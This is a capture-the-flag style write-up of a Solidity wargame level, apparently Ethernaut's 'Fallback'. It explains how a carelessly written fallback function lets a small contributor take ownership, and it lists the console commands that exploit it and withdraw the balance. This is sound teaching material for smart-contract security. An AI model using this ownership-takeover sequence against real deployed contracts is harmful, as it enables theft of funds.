This level is a simple way to display that fallback functions can have unintended consequences if implemented thoughtlessly.

## The Fallback Function

A fallback function is a solidity function that is called when no other function in the smart contract matches the function name called.
It allows the contract to receive ether if it is marked payable.
More info here --> https://www.geeksforgeeks.org/solidity-fall-back-function/

## Explanation

The fallback function in this level is coded to change ownership of the contract if an address has contributed and that address sends a transaction with any amount of ether to the contract. 

It is also coded to change ownership if a contributor's balance surpasses that of the current owner(which is initially set at 1000 ether). To make matters worse, even if you wanted to contribute over 1000 ether, you'd have to do it in increments of less than .001 ether because of the 'require' statement:

```bash 
require(msg.value < 0.001 ether); 
```


## Solution

To solve this level you can either expend the effort to get 1001 ether, or:

1) Contribute to the contract
```bash 
    contract.contribute({ value: toWei(".0001", "ether"), from: player }) 
```
2) Send a transaction that triggers fallback function
```bash
    sendTransaction({ to: contract.address, value: toWei(".001", "ether"), from: player })
```
3) Withdraw from contract 
```bash
    contract.withdraw()
```

**To verify ownership after step 2 you can call 
```bash
    await contract.owner()
```